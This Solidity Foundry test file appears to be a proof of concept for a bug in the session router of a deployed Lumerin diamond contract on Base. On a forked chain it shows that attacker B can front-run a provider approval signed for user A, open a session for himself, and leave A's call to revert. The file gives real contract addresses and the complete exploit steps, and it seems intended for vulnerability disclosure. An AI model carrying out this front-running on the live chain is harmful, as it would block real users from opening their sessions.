// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";

interface IERC20Minimal {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

// Mirrors ISessionStorage.Session (field order matters for ABI decoding).
struct Session {
    address user;
    bytes32 bidId;
    uint256 stake;
    bytes closeoutReceipt;
    uint256 closeoutType;
    uint256 providerWithdrawnAmount;
    uint128 openedAt;
    uint128 endsAt;
    uint128 closedAt;
    bool isActive;
    bool isDirectPaymentFromUser;
}

interface IDiamond {
    function getToken() external view returns (address);
    function getProviderMinimumStake() external view returns (uint256);
    function getModelMinimumStake() external view returns (uint256);
    function getBidFee() external view returns (uint256);
    function getMinMaxBidPricePerSecond() external view returns (uint256, uint256);
    function getMaxSessionDuration() external view returns (uint128);
    function getIsProviderApprovalUsed(bytes memory approval_) external view returns (bool);
    function getUserSessions(
        address user_,
        uint256 offset_,
        uint256 limit_
    ) external view returns (bytes32[] memory, uint256);
    function getSession(bytes32 sessionId_) external view returns (Session memory);
    function isBidActive(bytes32 bidId_) external view returns (bool);
    function providerRegister(address provider_, uint256 amount_, string calldata endpoint_) external;
    function modelRegister(
        address modelOwner_,
        bytes32 baseModelId_,
        bytes32 ipfsCID_,
        uint256 fee_,
        uint256 amount_,
        string calldata name_,
        string[] memory tags_
    ) external;
    function postModelBid(
        address provider_,
        bytes32 modelId_,
        uint256 pricePerSecond_
    ) external returns (bytes32 bidId);
    function getBidId(address provider_, bytes32 modelId_, uint256 nonce_) external pure returns (bytes32);
    function getModelId(address account_, bytes32 baseModelId_) external pure returns (bytes32);
    function openSession(
        address user_,
        uint256 amount_,
        bool isDirectPaymentFromUser_,
        bytes calldata approvalEncoded_,
        bytes calldata signature_
    ) external returns (bytes32);
}

/// @notice Full on-chain reproduction of Morpheus Lead 1 against the LIVE
/// Lumerin diamond on a Base fork (block 59525896). The provider approval is
/// signed for user A, but attacker B front-runs A's openSession and opens a
/// session for HIMSELF with the same approval. The victim's later call reverts
/// with SessionDuplicateApproval.
///
/// Run:
///   forge test --match-contract SessionRouterForkTest \
///     --fork-url <base-rpc> --fork-block-number 59525896 -vvv
///
/// Target: SessionRouter facet, Lumerin diamond on Base
///   0x6aBE1d282f72B474E54527D93b979A4f64d3030a
/// Token: MOR (OFT) 0x7431aDa8a591C955a994a21710752EF9b882b8e3
contract SessionRouterForkTest is Test {
    IDiamond constant DIAMOND = IDiamond(0x6aBE1d282f72B474E54527D93b979A4f64d3030a);
    address constant MOR = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;

    uint256 constant PROVIDER_PK = 0xA11CE;
    address provider;
    address userA = address(0xA);
    address userB = address(0xB);

    bytes32 bidId;
    bytes32 modelId;

    error SessionDuplicateApproval();

    function setUp() public {
        provider = vm.addr(PROVIDER_PK);

        // Fund everyone with MOR on the fork (fork-only state, no live tx).
        deal(MOR, provider, 1000 ether);
        deal(MOR, userA, 1000 ether);
        deal(MOR, userB, 1000 ether);

        vm.prank(provider);
        IERC20Minimal(MOR).approve(address(DIAMOND), type(uint256).max);
        vm.prank(userA);
        IERC20Minimal(MOR).approve(address(DIAMOND), type(uint256).max);
        vm.prank(userB);
        IERC20Minimal(MOR).approve(address(DIAMOND), type(uint256).max);

        // Provider registers (stake 1 MOR, min 0.2 MOR).
        vm.prank(provider);
        DIAMOND.providerRegister(provider, 1 ether, "https://poc.example");

        // Model registers, provider is the model owner (stake 1 MOR, min 0.1 MOR).
        vm.prank(provider);
        string[] memory tags = new string[](0);
        DIAMOND.modelRegister(
            provider,
            bytes32("poc-base-model"),
            bytes32("poc-ipfs-cid"),
            0,
            1 ether,
            "poc-model",
            tags
        );
        modelId = DIAMOND.getModelId(provider, bytes32("poc-base-model"));

        // Provider posts a bid at the minimum price per second (1e10 wei MOR/s).
        vm.prank(provider);
        bidId = DIAMOND.postModelBid(provider, modelId, 1e10);
        assertTrue(DIAMOND.isBidActive(bidId), "bid must be active");
        assertEq(bidId, DIAMOND.getBidId(provider, modelId, 0), "bid id mismatch");
    }

    /// @dev Builds the approval exactly like the off-chain helper
    /// (smart-contracts/utils/provider-helper.ts getProviderApproval):
    /// msg = abi.encode(bidId, chainId, user, timestamp);
    /// sig = provider.signMessage(keccak256(msg))
    function _approvalFor(address user_) internal view returns (bytes memory approval, bytes memory sig) {
        approval = abi.encode(bidId, block.chainid, user_, uint128(block.timestamp));
        bytes32 digest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", keccak256(approval)));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PROVIDER_PK, digest);
        sig = abi.encodePacked(r, s, v);
    }

    function test_ApprovalForA_UsedByB_OnLiveDiamond() public {
        (bytes memory approval, bytes memory sig) = _approvalFor(userA);

        // Attacker B front-runs: opens a session for HIMSELF with A's approval.
        vm.prank(userB);
        bytes32 sessionId = DIAMOND.openSession(userB, 100 ether, false, approval, sig);

        Session memory session = DIAMOND.getSession(sessionId);
        assertEq(session.user, userB, "live session belongs to attacker B");
        assertEq(session.bidId, bidId, "session bid mismatch");
        assertTrue(session.isActive, "session must be active");
        assertTrue(DIAMOND.getIsProviderApprovalUsed(approval), "approval marked used");

        (bytes32[] memory bSessions, ) = DIAMOND.getUserSessions(userB, 0, 10);
        assertEq(bSessions.length, 1, "B must have exactly one session");
        assertEq(bSessions[0], sessionId, "B session id mismatch");

        // The intended user A now tries their own approval: already consumed.
        vm.prank(userA);
        vm.expectRevert(SessionDuplicateApproval.selector);
        DIAMOND.openSession(userA, 100 ether, false, approval, sig);

        (bytes32[] memory aSessions, ) = DIAMOND.getUserSessions(userA, 0, 10);
        assertEq(aSessions.length, 0, "A must have no session");
    }
}
